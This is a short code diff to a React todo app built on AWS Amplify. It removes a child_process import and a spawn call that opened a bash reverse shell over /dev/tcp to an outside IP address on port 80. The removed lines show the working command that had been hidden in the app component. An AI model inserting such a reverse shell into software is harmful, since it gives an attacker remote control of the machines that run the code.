@@ -7,7 +7,7 @@ import "./../app/app.css";
 import { Amplify } from "aws-amplify";
 import outputs from "@/amplify_outputs.json";
 import "@aws-amplify/ui-react/styles.css";
-import { spawn } from 'child_process';
+
 
 Amplify.configure(outputs);
 
@@ -15,9 +15,6 @@ const client = generateClient<Schema>();
 
 export default function App() {
   const [todos, setTodos] = useState<Array<Schema["Todo"]["type"]>>([]);
-
-  const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
-  console.log(child);
 
   function listTodos() {
     client.models.Todo.observeQuery().subscribe({
